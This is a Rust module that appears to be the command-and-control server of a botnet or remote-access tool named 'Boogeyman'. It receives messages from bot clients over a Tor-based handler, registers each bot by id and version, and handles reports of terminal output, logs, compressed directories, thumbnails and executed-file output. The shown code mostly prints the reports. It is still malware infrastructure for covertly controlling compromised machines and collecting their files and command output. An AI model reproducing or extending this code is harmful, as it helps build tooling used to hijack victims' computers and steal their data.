use std::{ collections::HashMap, sync::Arc };
use chrono::Utc;
use client_vars::types::send::{ BoogeymanSendPayload, ServerAction, ServerParams };
use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
use super::tor::{ ClientBot, TorServerHandler };
use anyhow::Result;

pub async fn route_client(
    server_handler: &TorServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    match payload.action {
        ServerAction::Init => {
            return init(server_handler, payload, stream_ref).await;
        }
        ServerAction::TerminalOutput => {
            // in each - verify id and version - must exist in inited list if not ignore
            if let ServerParams::TerminalOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::LogsData => {
            if let ServerParams::LogsData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::CompressedDir => {
            if let ServerParams::CompressedDir(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateThumbnail => {
            if let ServerParams::UpdateThumbnail(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateDynamicData => {
            if let ServerParams::UpdateDynamicData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::ExecFileOutput => {
            if let ServerParams::ExecFileOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
    }
    Ok(())
}

pub async fn init(
    server_handler: &TorServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    if let ServerParams::Init(params) = payload.params {
        // first sanitize botstate

        let mut id_map = server_handler.client_bot_map.write().await;
        let lock = id_map
            .entry(payload.id.clone())
            .or_insert(Arc::new(RwLock::new(HashMap::new())));

        let mut version_map = lock.write().await;
        let current_time: String = Utc::now().to_string();
        version_map.insert(payload.version, ClientBot {
            id: payload.id,
            join_date: current_time,
            version: payload.version,
            bot_state: params.bot_state.clone(),
            console: String::new(),
        });
        drop(version_map);
        drop(id_map);
        Ok(())
    } else {
        return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
    }
}
